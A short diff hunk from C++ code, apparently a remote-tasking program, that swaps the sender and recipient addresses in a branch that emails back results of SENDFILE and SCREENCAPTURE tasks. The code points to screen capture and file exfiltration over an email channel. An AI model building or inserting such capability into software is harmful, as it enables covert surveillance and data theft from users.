@@ -156,8 +156,8 @@ int __cdecl main(void)
 					|| wcscmp(t.TaskName, L"SENDFILE") == 0
 					|| wcscmp(t.TaskName, L"SCREENCAPTURE") == 0)
 				{
-					std::string sender_email = SENDER_MAIL;
-					std::string recipient_email = CLIENT_MAIL;
+					std::string sender_email = CLIENT_MAIL;
+					std::string recipient_email = SENDER_MAIL;
 					std::string subject = "Respone from server " + messageContent[0];
 					std::string body = "The file is generated";
 					std::wstring temp(t.TaskDescribe);
